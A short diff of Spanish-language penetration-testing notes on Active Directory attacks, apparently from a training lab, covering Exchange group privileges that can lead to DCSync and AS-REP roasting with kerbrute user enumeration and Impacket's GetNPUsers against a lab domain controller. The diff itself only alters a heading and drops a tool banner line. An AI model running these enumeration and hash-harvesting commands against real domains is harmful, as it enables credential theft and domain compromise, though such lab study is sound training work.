@@ -1,4 +1,4 @@
-#ASREPRoasting 
+AAB#ASREPRoasting 
 ## **Exchange Related Group Membership**
 
 El grupo `Exchange Windows Permissions`no está considerado como protected group, pero los miembros de este grupo tienen la habilidad de escribir DACL en objetos del dominio, lo cual puede terminar dándonos privilegios de DSync. El grupo  `Organization Management` es un grupo extremadamente poderoso también (”domain admins” de exchange)
@@ -101,7 +101,6 @@ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 Con esta herramienta podemos hacer lo mismo que con el comando anterior, pero necesitaremos una lista válida de usuarios del DC
 ```bash
 GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
-Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
 ```
 ### Descifrando el hash con hashcat
 ```bash
